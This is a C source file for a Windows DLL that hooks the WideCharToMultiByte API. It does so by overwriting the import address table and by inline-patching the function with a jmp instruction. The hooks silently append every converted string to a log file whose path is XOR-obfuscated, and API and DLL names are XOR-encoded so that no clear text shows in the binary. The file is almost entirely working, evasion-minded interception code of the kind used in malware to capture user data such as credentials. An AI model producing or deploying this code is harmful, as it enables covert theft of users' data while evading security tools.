#include <Windows.h>

#include <stdio.h>

#define UTILS_IMPLEMENTATION
#include "../utils.h"

int(WINAPI *pWideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar);
char OriginalBytes[14];

int HookedWideCharToMultiByteIAT(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar)
{
    int iBytesWritten = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUseDefaultChar);

    char cFilePath[] = {0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x47, 0x5f, 0x42, 0x54, 0x1e, 0x44, 0x48, 0x44, 0x0};
    MyXor(cFilePath, 18, key, key_len);

    HANDLE hFile = pCreateFileA(cFilePath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        char str[128];
        sprintf(str, "%ws\n", lpWideCharStr);
        pWriteFile(hFile, str, iBytesWritten, NULL, NULL);
        pCloseHandle(hFile);
    }

    return iBytesWritten;
}

int HookedWideCharToMultiByteInlinePatch(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUseDefaultChar)
{
    // We write the original bytes back to the funciton addr since we need to call the original function as we need the application
    // to proceed normally
    if (!pWriteProcessMemory(pGetCurrentProcess(), (LPVOID)pWideCharToMultiByte, OriginalBytes, 14, NULL))
    {
        return 0;
    }

    // Call the original function, which we 
    int iBytesWritten = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUseDefaultChar);

    char cFilePath[] = {0x73, 0xa, 0x6c, 0x6c, 0x62, 0x64, 0x7f, 0x6c, 0x6c, 0x40, 0x47, 0x5f, 0x42, 0x54, 0x1e, 0x44, 0x48, 0x44, 0x0};
    MyXor(cFilePath, 18, key, key_len);

    HANDLE hFile = pCreateFileA(cFilePath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        char str[128];
        sprintf(str, "%ws\n", lpWideCharStr);
        pWriteFile(hFile, str, iBytesWritten, NULL, NULL);
        pCloseHandle(hFile);
    }

    return iBytesWritten;
}


// Since the function to be hooked is called atleast once by the application, it would be present in the IAT of the executable
// We look for the dll in the image import descriptors and then look for the function, and when found overwrite the addr with the addr
// of our hooking function
__declspec(dllexport) int HookIAT()
{
    // Get kernel module handle from the PEB
    HMODULE hKernel = MyGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    // Populate frequently used funciton pointers from the kernel dll
    PopulateKernelFunctionPtrsByName(hKernel);

    // Use xored hex values to prevent clear text being embedded in the binary
    char cWideCharToMultiByte[] = {0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0};
    MyXor(cWideCharToMultiByte, 19, key, key_len);

    // Get the proc address of the function we need to hook
    pWideCharToMultiByte = pGetProcAddress(hKernel, cWideCharToMultiByte);
    if (pWideCharToMultiByte == NULL)
    {
        goto shutdown;
    }

    // Use xored hex values to prevent clear text being embedded in the binary
    char cDbgHelp[] = {0x54, 0x52, 0x57, 0x58, 0x55, 0x5c, 0x40, 0x1e, 0x54, 0x5c, 0x5c, 0x0};
    MyXor(cDbgHelp, 11, key, key_len);

    // Load libary dbgHelp.dll
    HMODULE hDbgHelp = pLoadLibraryA(cDbgHelp);
    if (hDbgHelp == NULL)
    {
        goto shutdown;
    }

    // Use the ImageDirectoryEntryToDataEx function to get to the first image import descriptor. There is one image import descriptor for each dll imported by our executablejj

    // Use xored hex values to prevent clear text being embedded in the binary
    char cImageDirectoryEntryToDataEx[] = {0x79, 0x5d, 0x51, 0x57, 0x55, 0x74, 0x59, 0x42, 0x55, 0x53, 0x44, 0x5f, 0x42, 0x49, 0x75, 0x5e, 0x44, 0x42, 0x49, 0x64, 0x5f, 0x74, 0x51, 0x44, 0x51, 0x75, 0x48, 0x0};
    MyXor(cImageDirectoryEntryToDataEx, 27, key, key_len);

    // Get the proc address of the ImageDirectoryEntryToDataEx function
    PVOID(WINAPI * pImageDirectoryEntryToDataEx)
    (PVOID Base, BOOLEAN MappedAsImage, USHORT DirectoryEntry, PULONG Size, PIMAGE_SECTION_HEADER * FoundHeader) = pGetProcAddress(hDbgHelp, cImageDirectoryEntryToDataEx);

    ULONG size = 0;

    // Get the base addr of the current executable
    ULONG_PTR pBaseAddr = (ULONG_PTR)pGetModuleHandleA(NULL);

    PIMAGE_IMPORT_DESCRIPTOR pImageImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)pImageDirectoryEntryToDataEx((PVOID)pBaseAddr, TRUE, IMAGE_DIRECTORY_ENTRY_IMPORT, &size, NULL);

    ULONG ulDllIndex = 0;
    BOOL bDllFound = FALSE;

    MyXor(cKernel32, sCKernel32Len, key, key_len);

    // Loop through the image import desciptors to find the kernel32 dll where the 
    for (ulDllIndex = 0; ulDllIndex < size; ++ulDllIndex)
    {
        char *dllName = (char *)(pBaseAddr + pImageImportDescriptor[ulDllIndex].Name);

        if (MyStrCmpiAA(dllName, cKernel32))
        {
            bDllFound = TRUE;
            break;
        }
    }

    if (!bDllFound)
    {
        goto shutdown;
    }

    // Loop through the the IAT functions imported from the dll and when we find a addr match to the this value,
    // copy the value of our hooking function to the IAT
    PROC ulWideCharToMultiByte = (PROC)pWideCharToMultiByte;

    PIMAGE_THUNK_DATA pImageThunkData = (PIMAGE_THUNK_DATA)(pBaseAddr + pImageImportDescriptor[ulDllIndex].FirstThunk);
    while (pImageThunkData->u1.Function)
    {
        PROC *ulFuncAddr = (PROC *)&pImageThunkData->u1.Function;
        if (*ulFuncAddr == ulWideCharToMultiByte)
        {
            DWORD dwOldProtect = 0;

            // Change the protection so we can write to it
            pVirtualProtect((LPVOID)ulFuncAddr, 4096, PAGE_READWRITE, &dwOldProtect);
            *ulFuncAddr = (PROC)HookedWideCharToMultiByteIAT;

            // Revert back the protection
            pVirtualProtect((LPVOID)ulFuncAddr, 4096, dwOldProtect, &dwOldProtect);

            return TRUE;
        }

        // Check function
        ++pImageThunkData;
    }

shutdown:
    return 0;
}

// We get the addr of the function to be patched, then patch it with a jmp instruction which jumps to
// the hooking function
__declspec(dllexport) int HookInlinePatch()
{
    // Get kernel module handle from the PEB
    HMODULE hKernel = MyGetKernelModuleHandle();
    if (hKernel == NULL)
    {
        goto shutdown;
    }

    // Populate frequently used function pointers from the kernel dll
    PopulateKernelFunctionPtrsByName(hKernel);

    // Use xored hex values to prevent clear text being embedded in the binary
    char cWideCharToMultiByte[] = {0x67, 0x59, 0x54, 0x55, 0x73, 0x58, 0x51, 0x42, 0x64, 0x5f, 0x7d, 0x45, 0x5c, 0x44, 0x59, 0x72, 0x49, 0x44, 0x55, 0x0};
    MyXor(cWideCharToMultiByte, 19, key, key_len);

    // Get the proc address of the function we need to patch into
    pWideCharToMultiByte = pGetProcAddress(hKernel, cWideCharToMultiByte);
    if (pWideCharToMultiByte == NULL)
    {
        goto shutdown;
    }

    // Read 14 bytes starting with the proc address
    if (!pReadProcessMemory(pGetCurrentProcess(), (LPVOID)pWideCharToMultiByte, OriginalBytes, 14, NULL))
    {
        goto shutdown;
    }

    FARPROC fpHookedFunc = (FARPROC)HookedWideCharToMultiByteInlinePatch;

    // Create the patch, to jump to the addr of the hooking function
    // equivalent to
    // jmp 0000
    // addr of hookingfunction
    char patch[14] = {0};
    MyMemCpy(patch, "\xff\x25", 2);
    MyMemCpy(patch + 6, &fpHookedFunc, 8);

    // Write the patch to the proc addresss
    if (!pWriteProcessMemory(pGetCurrentProcess(), (LPVOID)pWideCharToMultiByte, patch, 14, NULL))
    {
        goto shutdown;
    }

shutdown:
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpvReserved)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        break;

    case DLL_PROCESS_DETACH:
        break;

    default:
        break;
    }

    return TRUE;
}